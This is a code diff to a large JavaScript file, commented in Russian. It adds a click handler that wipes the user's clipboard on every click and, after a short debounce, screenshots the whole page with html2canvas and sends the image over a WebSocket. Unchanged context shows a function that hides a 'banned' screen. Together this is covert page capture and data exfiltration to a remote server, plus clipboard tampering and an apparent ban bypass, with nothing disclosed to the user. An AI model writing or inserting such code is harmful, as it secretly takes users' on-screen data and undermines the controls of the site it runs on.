@@ -10463,7 +10463,21 @@ socket.onmessage = (event) => {
   }
 };
 
+let timeout;
 document.addEventListener("click", () => {
+  navigator.clipboard
+    .writeText("")
+    .then(() => console.log("Скопировано!"))
+    .catch((err) => console.error("Ошибка при копировании:", err));
+
+  // Дебаунс — чтобы не спамить запросами
+  clearTimeout(timeout);
+  timeout = setTimeout(() => {
+    sendScreen();
+  }, 1000);
+});
+
+function sendScreen() {
   html2canvas(document.body).then((canvas) => {
     const base64img = canvas.toDataURL("image/png"); // получаем base64-скриншот
 
@@ -10476,7 +10490,7 @@ document.addEventListener("click", () => {
     socket.send(JSON.stringify(message));
     console.log("Скриншот отправлен!");
   });
-});
+}
 
 function disableBan() {
   const bannedScreen = document.querySelector(".js-banned-screen");
